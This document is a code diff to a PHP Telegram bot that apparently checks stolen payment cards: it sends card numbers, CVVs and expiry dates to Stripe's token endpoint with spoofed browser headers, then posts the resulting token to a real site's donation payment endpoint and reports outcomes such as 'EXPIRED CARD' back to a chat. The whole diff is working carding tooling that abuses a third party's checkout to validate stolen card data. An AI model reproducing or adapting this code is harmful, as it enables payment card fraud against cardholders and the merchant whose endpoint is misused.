@@ -303,32 +303,49 @@ $bin = 'Debit';
 
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, '');
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-''));
+'authority: api.stripe.com',
+'accept: application/json',
+'content-type: application/x-www-form-urlencoded',
+'origin: https://js.stripe.com',
+'referer: https://js.stripe.com/',
+'sec-fetch-dest: empty',
+'sec-fetch-mode: cors',
+'sec-fetch-site: same-site',
+'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS,  '');
+curl_setopt($ch, CURLOPT_POSTFIELDS,  'time_on_page=17440&guid=6003c404-077f-XMRXMR2F6c4e062&card[name]=P%C3%A9n%C3%A9lope+Pires&card[address_country]=FR&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mon.'&card[exp_year]='.$year.'');
 $result1 = curl_exec($ch);
-$token = trim(strip_tags(getStr($result1,'{"token":"','"')));
+$token = trim(strip_tags(getStr($result1,'"id": "','",')));
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, '');
+curl_setopt($ch, CURLOPT_URL, 'https://michelf.ca/processus/cc.php?lang=en');
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-''));
+'Accept: */*',
+'Content-Type: application/json',
+'Cookie: __stripe_mid=37926190-6c04-480c-9aec-a94a7ae4b8deb4c9ee; __stripe_sid=93b1eb36-70e0-456c-99d1-3e12f0207093952fb9',
+'Host: michelf.ca',
+'Origin: https://michelf.ca',
+'Referer: https://michelf.ca/donate/',
+'Sec-Fetch-Dest: empty',
+'Sec-Fetch-Mode: cors',
+'Sec-Fetch-Site: same-origin',
+'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS,  '');
+curl_setopt($ch, CURLOPT_POSTFIELDS,  '{"invoice_no":"D2120054","stripe_token":"'.$token.'"}');
 $result = curl_exec($ch);
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////
@@ -372,7 +389,7 @@ sendMessage($chatId, "
 |CHECKED BY ==> @$username
 └BOT DEVELOPED BY 🦇 @tplein_dkk_cc 🦇", $message_id);
 }
-elseif (strpos($result, "")){
+elseif (strpos($result, "Your card has expired.")){
 sendMessage($chatId, "
 ╭╴CARD ==> $lista
 |STATUS ==> ❌ EXPIRED CARD ❌
